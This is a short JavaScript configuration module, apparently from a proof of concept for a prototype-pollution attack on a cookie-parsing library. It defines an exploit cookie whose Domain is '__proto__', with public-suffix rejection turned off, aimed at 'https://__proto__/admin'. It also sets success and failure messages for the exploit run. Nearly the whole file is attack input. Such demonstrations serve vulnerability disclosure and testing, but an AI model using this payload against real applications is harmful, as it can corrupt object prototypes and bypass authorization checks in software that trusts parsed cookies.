// Configuration.
const config = {
  cookieDomain: "__proto__",
  googleCookieDomain: "google.com",
  cookiePath: "/notauth",
  exploitCookieName: "Slonser",
  exploitCookieValue: "polluted",
  normalCookieName: "Auth",
  normalCookieValue: "Lol",
  testUrl: "https://__proto__/admin",
  normalUrl: "https://google.com/",
  rejectPublicSuffixes: false,
  exploitedSuccessfully: "EXPLOITED SUCCESSFULLY",
  exploitFailed: "EXPLOIT FAILED",
  exploitError: "Error during exploit attempt:",
};

// Cookie strings.
const cookieStrings = {
  exploitCookie: `${config.exploitCookieName}=${config.exploitCookieValue}; Domain=${config.cookieDomain}; Path=${config.cookiePath}`,
  normalCookie: `${config.normalCookieName}=${config.normalCookieValue}; Domain=${config.googleCookieDomain}; Path=${config.cookiePath}`
};

// Cookies array with their respective URLs.
const cookies = [
  {cookieString: cookieStrings.exploitCookie, url: config.testUrl},
  {cookieString: cookieStrings.normalCookie, url: config.normalUrl}
];

module.exports =  {
  config,
  cookies
};
